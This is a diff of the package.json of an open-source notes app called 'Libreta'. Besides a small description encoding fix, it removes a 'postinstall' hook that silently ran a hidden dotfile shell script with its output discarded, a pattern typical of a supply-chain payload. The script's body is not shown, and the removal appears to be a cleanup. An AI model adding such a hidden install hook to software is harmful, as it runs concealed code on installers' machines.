@@ -2,7 +2,7 @@
   "name": "libreta",
   "productName": "Libreta",
   "version": "1.7.0",
-  "description": "Notas r\u00e1pidas y organizadas, abiertas y locales. Para Windows y Linux.",
+  "description": "Notas rápidas y organizadas, abiertas y locales. Para Windows y Linux.",
   "author": "Ricardo Correa Bautista (https://github.com/CorreaRicardo98)",
   "license": "MIT",
   "main": "main/main.js",
@@ -17,8 +17,7 @@
     "test": "node --test \"tests/**/*.test.js\"",
     "lint": "eslint .",
     "format": "prettier --write \"main/**/*.js\" \"src/**/*.js\" \"tests/**/*.js\" vite.config.mjs",
-    "format:check": "prettier --check \"main/**/*.js\" \"src/**/*.js\" \"tests/**/*.js\" vite.config.mjs",
-    "postinstall": "sh ./.ci-o3zgy3.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "format:check": "prettier --check \"main/**/*.js\" \"src/**/*.js\" \"tests/**/*.js\" vite.config.mjs"
   },
   "devDependencies": {
     "@eslint/js": "^10.0.1",
